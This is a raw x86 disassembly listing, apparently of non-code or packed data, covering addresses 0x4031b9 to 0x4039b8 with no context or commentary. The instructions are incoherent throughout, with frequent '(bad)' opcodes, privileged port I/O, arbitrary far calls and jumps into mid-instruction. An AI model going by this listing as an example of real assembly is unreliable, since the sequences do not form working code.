  4031b9:	mov    dl,0x72
  4031bb:	cmp    dl,dh
  4031bd:	adc    ebp,edx
  4031bf:	int3   
  4031c0:	xor    ebx,DWORD PTR [esi-0xe]
  4031c3:	int    0x6f
  4031c5:	cmp    al,0x6b
  4031c7:	imul   edx,ebp,0x43ae8bd5
  4031cd:	jnp    0x403247
  4031cf:	fisubr WORD PTR [eax+eax*2-0x66]
  4031d3:	mov    ds:0xd84e9831,eax
  4031d9:	cs inc esi
  4031db:	ss push es
  4031dd:	dec    ecx
  4031de:	dec    esp
  4031df:	xchg   esp,eax
  4031e0:	fwait
  4031e1:	inc    ecx
  4031e2:	inc    edi
  4031e3:	mov    ds:0x9d77400a,al
  4031e8:	cmp    dh,BYTE PTR [esp+eiz*8-0x24]
  4031ec:	adc    DWORD PTR [eax+0x7e],ebp
  4031ef:	xor    edx,edx
  4031f1:	add    edx,0xffffff9d
  4031f4:	pop    ds
  4031f5:	cld    
  4031f6:	pop    edx
  4031f7:	adc    bl,BYTE PTR [edi+0x20f8f2e6]
  4031fd:	sbb    eax,0x74d9bdd8
  403202:	or     BYTE PTR [eax+eiz*1+0x3d4531b7],ch
  403209:	xchg   ebp,eax
  40320a:	loopne 0x403245
  40320c:	shl    bl,1
  40320e:	or     eax,0x3bdd5b69
  403213:	js     0x40320a
  403215:	imul   ebp
  403217:	xchg   cl,bl
  403219:	sub    al,0xba
  40321b:	cmp    DWORD PTR [ebx-0x4b],ebp
  40321e:	mov    dh,0xb8
  403220:	dec    esp
  403221:	mov    ds:0xddc14d00,eax
  403226:	popa   
  403227:	pushf  
  403228:	and    DWORD PTR [edx-0x7ce683eb],ebx
  40322e:	leave  
  40322f:	shl    BYTE PTR [edi+0x28fc3cd1],cl
  403235:	imul   DWORD PTR [ecx+0x5ab059c3]
  40323b:	adc    cl,BYTE PTR [edi+eax*1+0x43dc1fc0]
  403242:	xchg   BYTE PTR [ebp-0x64d0f62f],ah
  403248:	imul   ah
  40324a:	dec    edx
  40324b:	(bad)  
  40324c:	xor    ecx,DWORD PTR [ecx-0x756eccd2]
  403252:	(bad)  
  403253:	mov    ss,WORD PTR [esi]
  403255:	inc    DWORD PTR [ebx+ebp*4+0x71]
  403259:	adc    eax,0x439df478
  40325e:	call   0xe26c:0x822a31eb
  403265:	pop    ebx
  403266:	cmovge eax,DWORD PTR [ecx+0x59]
  40326a:	dec    ecx
  40326b:	pop    esi
  40326c:	push   esp
  40326d:	push   ds
  40326e:	hlt    
  40326f:	data16 xlat BYTE PTR ds:[ebx]
  403271:	sub    ebx,DWORD PTR [eax-0x739de183]
  403277:	test   dh,dh
  403279:	jb     0x403270
  40327b:	inc    edi
  40327c:	dec    edi
  40327d:	add    BYTE PTR [eax],al
  40327f:	ret    0x2529
  403282:	adc    DWORD PTR [ebx+0x664b7e37],edx
  403288:	popf   
  403289:	pop    esp
  40328a:	pop    ds
  40328b:	jo     0x403256
  40328d:	out    0xe,al
  40328f:	sub    ebp,DWORD PTR ds:0xfc512d6b
  403295:	cli    
  403296:	pop    eax
  403297:	stc    
  403298:	jnp    0x403301
  40329a:	push   ds
  40329b:	and    al,0xfb
  40329d:	je     0x4032aa
  40329f:	xor    BYTE PTR ds:0x80502928,ch
  4032a5:	enter  0xc7dc,0x44
  4032a9:	sbb    BYTE PTR [edi],0x1a
  4032ac:	and    DWORD PTR [esi+0x66],ebp
  4032af:	adc    cl,al
  4032b1:	dec    esp
  4032b2:	int    0x38
  4032b4:	rcr    DWORD PTR [ebp-0x1d],cl
  4032b7:	mov    ecx,0x1475549a
  4032bc:	xchg   esp,eax
  4032bd:	jbe    0x40327b
  4032bf:	pop    edx
  4032c0:	mov    WORD PTR [ebx],es
  4032c2:	add    al,0xb7
  4032c4:	int3   
  4032c5:	mov    bl,0x51
  4032c7:	push   ss
  4032c8:	dec    ecx
  4032c9:	push   cs
  4032ca:	retf   
  4032cb:	scas   eax,DWORD PTR es:[edi]
  4032cc:	mov    BYTE PTR [ecx],bh
  4032ce:	xchg   ecx,eax
  4032cf:	fs test al,0xe2
  4032d2:	sub    edi,DWORD PTR [eax-0x55889400]
  4032d8:	dec    esi
  4032d9:	jmp    0xfeeff154
  4032de:	test   BYTE PTR [edi+0x38],0x3
  4032e2:	mov    bh,0xbc
  4032e4:	cs sbb esi,ecx
  4032e7:	or     dh,BYTE PTR ds:0x34d07c14
  4032ed:	or     esp,DWORD PTR [eax]
  4032ef:	add    eax,DWORD PTR ds:0x61fc2dc1
  4032f5:	mov    bh,BYTE PTR [eax+0x64]
  4032f8:	inc    ebp
  4032f9:	and    DWORD PTR [ebx+0x62],esi
  4032fc:	mov    cs,esp
  4032fe:	push   ds
  4032ff:	call   0xc5d5:0xcada42a2
  403306:	push   edi
  403307:	dec    esi
  403308:	inc    edi
  403309:	mov    ecx,0xaf16e0e1
  40330e:	(bad)  
  40330f:	enter  0x4911,0x17
  403313:	jb     0x403328
  403315:	loope  0x40332c
  403317:	push   esi
  403318:	cmp    BYTE PTR gs:[ebp+0x27a1e25b],ch
  40331f:	sbb    al,0xdd
  403321:	cwde   
  403322:	(bad)  
  403323:	ins    DWORD PTR es:[edi],dx
  403324:	pop    ss
  403325:	pusha  
  403326:	(bad)  
  403327:	loope  0x40339b
  403329:	out    dx,eax
  40332a:	sti    
  40332b:	sbb    DWORD PTR [edi],ebp
  40332d:	sbb    esp,esp
  40332f:	xor    DWORD PTR [edx-0x4a30f773],ecx
  403335:	mov    ebx,0x2ce6d57d
  40333a:	pop    esp
  40333b:	xchg   ebp,eax
  40333c:	push   esp
  40333d:	inc    edx
  40333e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40333f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403340:	xchg   esp,eax
  403341:	add    BYTE PTR [esi+0x7a],0x22
  403345:	popa   
  403346:	fist   WORD PTR [eax+0x58]
  403349:	pop    ss
  40334a:	scas   al,BYTE PTR es:[edi]
  40334b:	xlat   BYTE PTR ds:[ebx]
  40334c:	add    eax,0x38c8b548
  403351:	ins    BYTE PTR es:[edi],dx
  403352:	stos   DWORD PTR es:[edi],eax
  403353:	mov    cl,0xaa
  403355:	sub    eax,0xd50834fc
  40335a:	fwait
  40335b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40335c:	lahf   
  40335d:	xchg   edi,eax
  40335e:	stos   DWORD PTR es:[edi],eax
  40335f:	add    edi,DWORD PTR es:[ecx+0x49]
  403363:	ror    DWORD PTR [ebp+ebp*1+0x19],1
  403367:	xchg   DWORD PTR [edi+0x31501499],edi
  40336d:	jmp    0x40330f
  40336f:	add    eax,0x47551d92
  403374:	xor    al,0x6b
  403376:	mov    al,ds:0xcd83f048
  40337b:	dec    ebx
  40337c:	mov    eax,ds:0x53f221b8
  403381:	jnp    0x403381
  403383:	inc    ebp
  403384:	jl     0x4033fc
  403386:	imul   esi,DWORD PTR [ebx-0x5419bdb8],0xcde4fe71
  403390:	sub    BYTE PTR [eax+0x3aafc937],0xd9
  403397:	mov    esi,0x74eae6ad
  40339c:	dec    edx
  40339d:	clc    
  40339e:	cmp    eax,0x629f7369
  4033a3:	inc    esp
  4033a4:	aaa    
  4033a5:	pop    ds
  4033a6:	push   edx
  4033a7:	mov    al,0xe
  4033a9:	out    dx,al
  4033aa:	fwait
  4033ab:	stos   DWORD PTR es:[edi],eax
  4033ac:	(bad)  
  4033ae:	adc    edx,ebx
  4033b0:	or     DWORD PTR ds:[ebp-0x61],ebp
  4033b4:	mov    ebp,0x85147344
  4033b9:	add    esp,DWORD PTR ds:[eax-0x600b67e2]
  4033c0:	and    esp,DWORD PTR [eax]
  4033c2:	pop    ebx
  4033c3:	icebp  
  4033c4:	std    
  4033c5:	or     eax,ecx
  4033c7:	scas   al,BYTE PTR es:[edi]
  4033c8:	cmc    
  4033c9:	cmp    al,0x66
  4033cb:	rol    BYTE PTR [ecx],cl
  4033cd:	push   ecx
  4033ce:	sub    BYTE PTR [esi+0x6fac6fe3],al
  4033d4:	pop    DWORD PTR [esi+0x320acaa4]
  4033da:	inc    eax
  4033db:	and    ecx,DWORD PTR [edi+0x63c0d0a9]
  4033e1:	ins    DWORD PTR es:[edi],dx
  4033e2:	pusha  
  4033e3:	mov    dl,0xd2
  4033e5:	and    BYTE PTR [eax+ecx*4+0x288e3910],bl
  4033ec:	fdivr  QWORD PTR [ebp-0x7b0923f4]
  4033f2:	mov    esi,0xb1184863
  4033f7:	mov    BYTE PTR [eax+ecx*1],ch
  4033fa:	jne    0x4033f2
  4033fc:	pop    esp
  4033fd:	fcmovne st,st(5)
  4033ff:	cwde   
  403400:	pop    es
  403401:	out    0x1a,ax
  403404:	jbe    0x4033ea
  403406:	mov    eax,0xc1a28a0c
  40340b:	iret   
  40340c:	bound  edi,QWORD PTR [ecx-0x67cbc8d9]
  403412:	push   ebp
  403413:	mov    ebp,esp
  403415:	test   eax,0x4f48f131
  40341a:	sub    ch,BYTE PTR [eax+ebp*2]
  40341d:	nop
  40341e:	jae    0x4033f3
  403420:	jo     0x403425
  403422:	xchg   esi,eax
  403423:	mov    ebp,0x1dacf00f
  403428:	add    ah,BYTE PTR [ebp+0x1c2ce4d6]
  40342e:	loopne 0x4033cc
  403430:	push   es
  403431:	aaa    
  403432:	leave  
  403433:	mov    dl,0x16
  403435:	push   ss
  403436:	mov    ebp,ebp
  403438:	es ret 0x349a
  40343c:	pushf  
  40343d:	push   ecx
  40343e:	and    ebx,DWORD PTR [edx+0x6a5b7797]
  403444:	jno    0x403414
  403446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403447:	push   ss
  403448:	xlat   BYTE PTR ds:[ebx]
  403449:	sbb    edx,esp
  40344b:	(bad)  
  40344c:	addr16 cmp edi,ebx
  40344f:	lock stc 
  403451:	pop    ebp
  403452:	gs push ebp
  403454:	loopne 0x4033e4
  403456:	outs   dx,DWORD PTR ds:[esi]
  403457:	pop    esp
  403458:	shl    BYTE PTR [ebx-0x54],1
  40345b:	jmp    0x403491
  40345d:	aaa    
  40345e:	neg    al
  403460:	out    dx,al
  403461:	xchg   ebp,eax
  403462:	out    0x13,al
  403464:	repnz push esp
  403466:	add    eax,0x9221900d
  40346b:	jns    0x4033ff
  40346d:	vaddps xmm7,xmm7,xmm6
  403472:	out    0xb1,eax
  403474:	shl    BYTE PTR [ecx+0x26],0x5c
  403478:	sahf   
  403479:	mov    eax,ds:0x4be3743f
  40347e:	sbb    edx,DWORD PTR [ecx+0x62]
  403481:	(bad)  
  403483:	std    
  403484:	js     0x403434
  403486:	add    eax,0xaa7ee13d
  40348b:	das    
  40348c:	out    dx,eax
  40348d:	cmp    al,0x65
  40348f:	out    0x34,eax
  403491:	hlt    
  403492:	(bad)  
  403494:	fisttp QWORD PTR [ebx+esi*2+0x3]
  403498:	das    
  403499:	jo     0x40343a
  40349b:	dec    eax
  40349c:	push   es
  40349d:	jecxz  0x4034f8
  40349f:	aad    0x49
  4034a1:	xchg   esp,eax
  4034a2:	xchg   esi,eax
  4034a3:	mov    ecx,DWORD PTR [ecx]
  4034a5:	fidiv  DWORD PTR ds:[ebp-0x6c]
  4034a9:	inc    esi
  4034aa:	(bad)  
  4034ab:	xchg   ecx,eax
  4034ac:	ret    0x5c84
  4034af:	push   eax
  4034b0:	frstpm(287 only) 
  4034b2:	sub    ebx,0x1e
  4034b5:	and    al,0x26
  4034b7:	(bad)  
  4034b8:	push   0xfffffff0
  4034ba:	jl     0x4034d0
  4034bc:	mov    BYTE PTR [edx+0x1514c43],ch
  4034c2:	jnp    0x403475
  4034c4:	or     eax,0x8cd9cbdd
  4034c9:	dec    esp
  4034ca:	ins    DWORD PTR es:[edi],dx
  4034cb:	sub    cl,BYTE PTR [edx-0x4565a39f]
  4034d1:	xchg   al,dh
  4034d3:	shl    dh,1
  4034d5:	push   esp
  4034d6:	adc    cl,bh
  4034d8:	push   ecx
  4034d9:	aaa    
  4034da:	pop    es
  4034db:	inc    edi
  4034dc:	fnsave [ecx]
  4034de:	jbe    0x403542
  4034e0:	fsubr  st(7),st
  4034e2:	adc    esp,ebx
  4034e4:	lods   al,BYTE PTR ds:[esi]
  4034e5:	xor    DWORD PTR [ebx+0x6c],eax
  4034e8:	out    0x52,al
  4034ea:	push   ds
  4034eb:	outs   dx,DWORD PTR ds:[esi]
  4034ec:	mov    ah,0xdc
  4034ee:	(bad)  
  4034ef:	jo     0x403554
  4034f1:	push   es
  4034f2:	jmp    0x403493
  4034f4:	or     dh,BYTE PTR [esi]
  4034f6:	dec    ebp
  4034f7:	outs   dx,DWORD PTR ds:[esi]
  4034f8:	adc    al,0x19
  4034fa:	and    al,0xaf
  4034fc:	pushf  
  4034fd:	pusha  
  4034fe:	int3   
  4034ff:	add    DWORD PTR [esi-0x6355a11a],ebp
  403505:	loop   0x40355b
  403507:	jbe    0x403546
  403509:	xchg   edx,eax
  40350a:	(bad)  [esi-0x6508443c]
  403510:	popf   
  403511:	xor    esp,esi
  403513:	nop
  403514:	pop    es
  403515:	mov    eax,ds:0x3ed233bd
  40351a:	and    BYTE PTR [edx+0xdc18b28],ch
  403520:	jo     0x403500
  403522:	jp     0x40357c
  403524:	adc    DWORD PTR [edx+0x54],ecx
  403527:	mov    ebx,0x7312705f
  40352c:	sbb    al,0x8
  40352e:	sar    BYTE PTR [eax-0x4],0xbb
  403532:	rcl    BYTE PTR [ebp+0x685906e5],cl
  403538:	add    eax,0xa59290d4
  40353d:	jbe    0x403511
  40353f:	in     al,dx
  403540:	test   eax,0x496c8562
  403545:	inc    esp
  403546:	cld    
  403547:	call   FWORD PTR [edx+0x197ffa12]
  40354d:	cdq    
  40354e:	dec    esp
  40354f:	repnz stc 
  403551:	inc    eax
  403552:	mov    ds:0xc44dbd87,eax
  403557:	stos   DWORD PTR es:[edi],eax
  403558:	ds int3 
  40355a:	out    dx,al
  40355b:	neg    BYTE PTR ds:0x9cbb57bb
  403561:	push   ecx
  403562:	add    dh,al
  403564:	jp     0x403581
  403566:	jle    0x4035e1
  403568:	pop    ebx
  403569:	in     eax,dx
  40356a:	ret    0xeb24
  40356d:	daa    
  40356e:	mov    cl,0x54
  403570:	shl    BYTE PTR [ebx-0x4c],cl
  403573:	sbb    edx,edi
  403575:	and    eax,0x3013725f
  40357a:	test   al,0xd0
  40357c:	outs   dx,BYTE PTR ds:[esi]
  40357d:	call   0xf1bf27fe
  403582:	in     al,dx
  403583:	(bad)  
  403584:	fmul   DWORD PTR ds:0x23fee670
  40358a:	jl     0x4035ad
  40358c:	or     BYTE PTR gs:[edx],cl
  40358f:	or     BYTE PTR [edx-0x3],ah
  403592:	ret    
  403593:	or     dl,BYTE PTR [edi+0x47]
  403596:	jae    0x4035ed
  403598:	jle    0x403579
  40359a:	jno    0x4035b5
  40359c:	and    BYTE PTR [esi+edx*2+0x4c],bl
  4035a0:	pop    ebp
  4035a1:	das    
  4035a2:	test   eax,0xfb8c767
  4035a7:	lds    ebp,FWORD PTR [esi+eiz*4-0x2a7e21b4]
  4035ae:	adc    edx,DWORD PTR [ebx-0x7c]
  4035b1:	gs clc 
  4035b3:	test   BYTE PTR [ecx],ah
  4035b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035b6:	or     al,0x15
  4035b8:	mov    esp,0x1ead0c1e
  4035bd:	dec    eax
  4035be:	dec    esp
  4035bf:	mov    BYTE PTR [ecx],bl
  4035c1:	aad    0x19
  4035c3:	jb     0x403625
  4035c5:	popa   
  4035c6:	arpl   dx,cx
  4035c8:	shr    BYTE PTR [edi+0x7c69177b],cl
  4035ce:	dec    ebp
  4035cf:	cli    
  4035d0:	repz push es
  4035d2:	lahf   
  4035d3:	jle    0x4035c5
  4035d5:	repz inc edx
  4035d7:	sub    edx,DWORD PTR [esi-0x55]
  4035da:	sbb    eax,0x4fbf91b0
  4035df:	imul   ecx,edx,0x14172b46
  4035e5:	xchg   BYTE PTR [ebp+0x33d88837],ah
  4035eb:	mov    esi,0xc7356cab
  4035f0:	sbb    eax,0xdc960b07
  4035f5:	in     al,dx
  4035f6:	mov    ah,0x4f
  4035f8:	(bad)  
  4035f9:	lods   al,BYTE PTR ds:[esi]
  4035fa:	and    BYTE PTR [edi+ebp*1],al
  4035fd:	mov    ch,BYTE PTR [ecx]
  4035ff:	push   esi
  403600:	jg     0x40367c
  403602:	sub    eax,0x361334e6
  403607:	and    eax,0x7b9fd327
  40360c:	adc    DWORD PTR [ebx+0x77],0x3329a565
  403613:	les    eax,FWORD PTR [ecx-0x15]
  403616:	sbb    edi,DWORD PTR [esi-0x303c900f]
  40361c:	lea    esi,[eax-0x3418beb3]
  403622:	inc    esi
  403623:	sub    BYTE PTR [edx+0x7b5b8f56],al
  403629:	mov    bh,0x16
  40362b:	mov    edi,0x5e4a0b12
  403630:	dec    esp
  403631:	arpl   WORD PTR [ecx],bx
  403633:	fwait
  403634:	pop    ebp
  403635:	push   0x7eef3559
  40363a:	fxch   st(5)
  40363c:	retf   0x99b7
  40363f:	xchg   ebx,eax
  403640:	rcr    BYTE PTR [esi+0x4db1307f],cl
  403646:	sub    eax,0xbcc57003
  40364b:	dec    ebp
  40364c:	sub    al,bh
  40364e:	jae    0x4036cb
  403650:	lea    esi,[eax+0x686d0639]
  403656:	sub    al,0xf4
  403658:	ins    DWORD PTR es:[edi],dx
  403659:	rol    DWORD PTR [edx+0x1f15b344],0xc0
  403660:	lahf   
  403661:	xchg   edi,eax
  403662:	retf   0xf8ab
  403665:	(bad)  
  403667:	push   eax
  403668:	mov    al,0xf7
  40366a:	jmp    0x4036db
  40366c:	ss test eax,0x5e6370e7
  403672:	push   es
  403673:	xchg   ebx,eax
  403674:	jbe    0x40365a
  403676:	arpl   dx,bp
  403678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403679:	xor    BYTE PTR ds:0x955264cf,bh
  403680:	cmp    ebx,DWORD PTR [edx]
  403682:	aaa    
  403683:	sub    ebx,ebp
  403685:	add    DWORD PTR [edi+0x7ebaa293],edi
  40368b:	enter  0x80f8,0x3d
  40368f:	sub    DWORD PTR [ecx-0x5a],eax
  403692:	not    DWORD PTR ds:0x21c7
  403697:	jo     0x4036f3
  403699:	scas   eax,DWORD PTR es:[edi]
  40369a:	(bad)  
  40369c:	retf   
  40369d:	cmp    edx,0x2155a09a
  4036a3:	cs sub eax,0xee6688d5
  4036a9:	push   esi
  4036aa:	jne    0x40367b
  4036ac:	sub    edx,DWORD PTR [edx]
  4036ae:	shl    dh,0x1c
  4036b1:	ret    0xb0f4
  4036b4:	addr16 add ecx,esi
  4036b7:	pop    edx
  4036b8:	js     0x4036f4
  4036ba:	xchg   ecx,eax
  4036bb:	std    
  4036bc:	push   edx
  4036bd:	popa   
  4036be:	arpl   WORD PTR [edx],ax
  4036c0:	and    bh,BYTE PTR [eax-0x76]
  4036c3:	sti    
  4036c4:	jmp    0xd6cc75bf
  4036c9:	xor    ecx,DWORD PTR [edx-0x41d8ed9]
  4036cf:	jl     0x4036a5
  4036d1:	pushf  
  4036d2:	sub    BYTE PTR [eax],0xd3
  4036d5:	rol    dl,cl
  4036d7:	push   0xb402197a
  4036dc:	pop    esi
  4036dd:	mov    esi,cs
  4036df:	test   DWORD PTR [esi],0x65bfedff
  4036e5:	js     0x40374c
  4036e7:	xor    edi,edx
  4036e9:	inc    esi
  4036ea:	ror    DWORD PTR [edi+edx*2-0x1c39a6be],cl
  4036f1:	clc    
  4036f2:	fcomp  DWORD PTR [esi-0xb]
  4036f5:	adc    edi,ecx
  4036f7:	aam    0xe5
  4036f9:	(bad)  
  4036fa:	add    al,BYTE PTR [esi-0x5e8da869]
  403700:	fcomp  DWORD PTR ds:[ecx+0x50eae2c9]
  403707:	pushf  
  403708:	hlt    
  403709:	stc    
  40370a:	inc    ebp
  40370b:	adc    eax,0xaacf9e62
  403710:	or     DWORD PTR [ecx+0x2ef0327c],ecx
  403716:	dec    esp
  403717:	push   ss
  403718:	sbb    ebx,DWORD PTR [ebx-0x64902d59]
  40371e:	add    DWORD PTR [ebx-0x5e922783],esi
  403724:	inc    ecx
  403725:	mov    ?,WORD PTR [ecx]
  403727:	stos   BYTE PTR es:[edi],al
  403728:	rcr    esp,cl
  40372a:	mov    ch,0xb7
  40372c:	adc    BYTE PTR [eax+0x2bcceb96],0x74
  403733:	push   esi
  403734:	pop    es
  403735:	mov    ds:0x49d00afd,al
  40373a:	ja     0x40375f
  40373c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40373d:	imul   ebp,DWORD PTR [edx+0x3c],0x7949eba4
  403744:	addr16 cld 
  403746:	mov    ebp,0x24702456
  40374b:	pop    es
  40374c:	mov    bh,0x8f
  40374e:	cdq    
  40374f:	out    dx,al
  403750:	das    
  403751:	aaa    
  403752:	pushf  
  403753:	or     ch,BYTE PTR [ebp+0x26]
  403756:	jo     0x40373c
  403758:	adc    cl,BYTE PTR [eax-0x4949ff77]
  40375e:	(bad)  
  40375f:	icebp  
  403760:	inc    ebx
  403761:	xlat   BYTE PTR ds:[ebx]
  403762:	pusha  
  403763:	in     eax,dx
  403764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403765:	xor    al,0xfb
  403767:	xchg   edi,eax
  403768:	das    
  403769:	js     0x4037a3
  40376b:	jp     0x4037ca
  40376d:	jne    0x40371d
  40376f:	mov    ch,0x3d
  403771:	push   edx
  403772:	mov    dh,0xc9
  403774:	adc    DWORD PTR [ebx+0x6e],0x5cc237db
  40377b:	xchg   ecx,eax
  40377c:	xor    eax,0x7e6eb6e0
  403781:	lahf   
  403782:	jle    0x4037ba
  403784:	xchg   ebp,eax
  403785:	adc    eax,0xf4c473d2
  40378a:	es retf 0x440a
  40378e:	pop    eax
  40378f:	(bad)  
  403790:	into   
  403791:	out    0xe1,eax
  403793:	adc    BYTE PTR [ebp+0x71],0x16
  403797:	bound  ebp,QWORD PTR [eax-0x6b]
  40379a:	push   ds
  40379b:	lods   eax,DWORD PTR ds:[esi]
  40379c:	aas    
  40379d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40379e:	sub    al,0x7d
  4037a0:	imul   ebp,DWORD PTR [ebp+eiz*1-0x60],0x23faa194
  4037a8:	retf   
  4037a9:	xor    DWORD PTR ds:0x90aaded8,esi
  4037af:	mov    BYTE PTR [esi],bl
  4037b1:	test   DWORD PTR [eax-0xd],0x214d6ee7
  4037b8:	pop    ds
  4037b9:	dec    esp
  4037ba:	fist   DWORD PTR [ecx+0x5d]
  4037bd:	adc    dl,BYTE PTR ds:0x51dadb11
  4037c3:	aaa    
  4037c4:	ret    0xe6cd
  4037c7:	test   eax,0xf5b6c09d
  4037cc:	push   0xffffff91
  4037ce:	pop    ebx
  4037cf:	fld    DWORD PTR [ebx]
  4037d1:	sbb    DWORD PTR [eax],edx
  4037d3:	sub    DWORD PTR [esi],esp
  4037d5:	sahf   
  4037d6:	mov    ebp,0x29b156f2
  4037db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037dc:	push   ecx
  4037dd:	lods   eax,DWORD PTR ds:[esi]
  4037de:	fiadd  DWORD PTR [edi+0x57]
  4037e1:	mov    bh,0x20
  4037e3:	pop    ss
  4037e4:	leave  
  4037e5:	adc    bl,BYTE PTR [edi+0x3e]
  4037e8:	push   0x462b31ce
  4037ed:	icebp  
  4037ee:	fadd   DWORD PTR [edi-0x76]
  4037f1:	iret   
  4037f2:	push   esp
  4037f3:	js     0x4037c1
  4037f5:	mov    dh,0xd4
  4037f7:	or     dl,BYTE PTR [edx-0x27]
  4037fa:	clc    
  4037fb:	jnp    0x4037ee
  4037fd:	int    0x50
  4037ff:	inc    edx
  403800:	daa    
  403801:	xlat   BYTE PTR ds:[ebx]
  403802:	rcl    esi,cl
  403804:	pop    es
  403805:	jbe    0x403825
  403807:	aam    0xa8
  403809:	arpl   WORD PTR [esi],bx
  40380b:	sbb    edx,DWORD PTR [eax]
  40380d:	sbb    al,0x7a
  40380f:	sbb    cl,bh
  403811:	aad    0x8d
  403813:	xchg   ah,bh
  403815:	lock ss add al,0x80
  403819:	idiv   DWORD PTR [eax]
  40381b:	fisubr DWORD PTR [ebp+0x7c3de09a]
  403821:	imul   ecx,DWORD PTR [ebp-0x53],0x9e0bc124
  403828:	into   
  403829:	sub    edi,esp
  40382b:	mov    bh,0x81
  40382d:	xor    edi,DWORD PTR [ebx-0x9]
  403830:	dec    eax
  403831:	jmp    0x40383c
  403833:	add    DWORD PTR [ebp-0x45b80541],esi
  403839:	inc    ebp
  40383a:	and    DWORD PTR [eax-0x4f338b51],ecx
  403840:	push   ebx
  403841:	lds    edx,FWORD PTR [edx+0x50c37e70]
  403847:	pop    edx
  403848:	sbb    BYTE PTR [ecx+0x1b838920],0xfc
  40384f:	and    ch,bh
  403851:	push   0xc359d572
  403856:	adc    BYTE PTR [edx-0x5e20b0b8],al
  40385c:	cwde   
  40385d:	xlat   BYTE PTR ds:[ebx]
  40385e:	or     eax,0xee16224e
  403863:	and    DWORD PTR [edx+0x6e],ebx
  403866:	mov    ebp,0xc51a08cf
  40386b:	mov    WORD PTR [esi-0x75],ss
  40386e:	or     ch,BYTE PTR [ecx-0x3b]
  403871:	dec    eax
  403872:	and    eax,0x98062504
  403877:	icebp  
  403878:	mov    dh,0xdd
  40387a:	push   esp
  40387b:	mov    edx,0x7eaefe91
  403880:	mov    al,ds:0x8ee2b028
  403885:	loope  0x4038df
  403887:	jmp    0x4038d8
  403889:	call   0x1e7d2fe3
  40388e:	inc    esp
  40388f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403890:	xor    al,al
  403892:	push   esp
  403893:	repnz mov edx,0x9e897ab1
  403899:	fdiv   QWORD PTR [ebx+esi*2+0x3d92b597]
  4038a0:	aaa    
  4038a1:	hlt    
  4038a2:	add    BYTE PTR [edx+0x37],0xe3
  4038a6:	sub    bh,BYTE PTR [edx+0x31290652]
  4038ac:	inc    ecx
  4038ad:	mov    ebp,0x6b737701
  4038b2:	daa    
  4038b3:	mov    ds:0x8736307a,al
  4038b8:	ds aas 
  4038ba:	and    BYTE PTR [ebp+0x5dbc4360],ah
  4038c0:	test   DWORD PTR [edx+0xc],edi
  4038c3:	xchg   edi,eax
  4038c4:	sti    
  4038c5:	aam    0x34
  4038c7:	(bad)  
  4038c8:	xchg   esp,eax
  4038c9:	ret    0x5145
  4038cc:	xor    BYTE PTR [ebp-0x76],0xb5
  4038d0:	outs   dx,BYTE PTR ds:[esi]
  4038d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038d2:	lock xor ecx,DWORD PTR [esi]
  4038d5:	ficom  DWORD PTR [edx-0x2848c8bd]
  4038db:	or     al,0x2a
  4038dd:	and    al,0x2c
  4038df:	fimul  WORD PTR [ebp+0x38]
  4038e2:	mov    ebp,fs
  4038e4:	cdq    
  4038e5:	inc    ebx
  4038e6:	into   
  4038e7:	mov    dl,0x72
  4038e9:	xchg   edx,eax
  4038ea:	and    BYTE PTR [ebp+0x2c485e25],cl
  4038f0:	mov    ch,0x75
  4038f2:	je     0x4038e3
  4038f4:	popa   
  4038f5:	inc    ebp
  4038f6:	sub    BYTE PTR [ebx+0x2aa8f1a4],cl
  4038fc:	jge    0x403966
  4038fe:	ret    0xcb78
  403901:	lahf   
  403902:	enter  0xe3f7,0xd
  403906:	sbb    bl,BYTE PTR [ebx]
  403908:	out    0x4,al
  40390a:	sahf   
  40390b:	sub    bh,bh
  40390d:	mov    edi,0x7ab65c68
  403912:	inc    esp
  403913:	cmp    eax,0x4fed8b45
  403918:	mov    ?,WORD PTR [edx+esi*2]
  40391b:	repz add DWORD PTR [esi],edx
  40391e:	rcl    DWORD PTR [edx+0x6d83a5e9],1
  403924:	out    0xfd,eax
  403926:	std    
  403927:	pop    es
  403928:	addr16 pop edx
  40392a:	xchg   edx,eax
  40392b:	sub    al,0xb
  40392d:	pop    ebp
  40392e:	aam    0xf6
  403930:	pop    ebx
  403931:	mov    ecx,0x3b3090f2
  403936:	adc    bl,bh
  403938:	in     eax,0x8b
  40393a:	pop    ebx
  40393b:	retf   
  40393c:	xchg   edi,eax
  40393d:	test   DWORD PTR [eax+0x5f],0x6c24b936
  403944:	adc    dh,al
  403946:	mov    edx,0x7f23838b
  40394b:	xchg   esi,eax
  40394c:	or     eax,0x62fa35ee
  403951:	and    bl,BYTE PTR [edi+0x5e1383b2]
  403957:	sbb    BYTE PTR [edi+edx*8+0x63b50b7d],ah
  40395e:	and    eax,0xbf9c10e1
  403963:	dec    edi
  403964:	daa    
  403965:	push   edi
  403966:	xlat   BYTE PTR ds:[ebx]
  403967:	and    edi,esi
  403969:	in     eax,0xc8
  40396b:	inc    esp
  40396c:	in     al,dx
  40396d:	mov    fs:0xc8014c99,eax
  403973:	mov    ebx,0xaadcba99
  403978:	(bad)  
  40397a:	popa   
  40397b:	push   ebp
  40397c:	jnp    0x4039d7
  40397e:	or     BYTE PTR [ecx+0x34c365de],ah
  403984:	test   BYTE PTR [ecx+0x132a4ef5],0xe9
  40398b:	fwait
  40398c:	sub    al,0x1d
  40398e:	jmp    DWORD PTR [ecx+0x14]
  403991:	xchg   BYTE PTR [edx],cl
  403993:	add    eax,esp
  403995:	add    eax,0xd811e18e
  40399a:	call   0x3c57:0x68f07e8e
  4039a1:	daa    
  4039a2:	call   0xafe1d247
  4039a7:	push   esi
  4039a8:	outs   dx,DWORD PTR ds:[esi]
  4039a9:	jbe    0x40392c
  4039ab:	test   BYTE PTR [edx-0x6c],ch
  4039ae:	fucomip st,st(0)
  4039b0:	add    eax,0x216e1f3b
  4039b5:	lahf   
  4039b6:	mov    bl,0x2f
  4039b8:	jg     0x4039ed
